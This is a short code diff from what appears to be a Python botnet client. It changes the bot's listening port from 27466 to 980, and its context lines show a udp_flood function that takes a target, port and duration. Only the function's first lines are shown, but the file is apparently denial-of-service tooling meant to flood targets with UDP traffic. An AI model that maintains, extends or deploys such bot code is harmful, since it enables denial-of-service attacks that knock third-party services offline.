@@ -4,7 +4,7 @@ import time
 import random
 
 BOT_HOST = '0.0.0.0'
-BOT_PORT = 27466
+BOT_PORT = 980
 
 def udp_flood(target, port, duration):
     timeout = time.time() + int(duration)
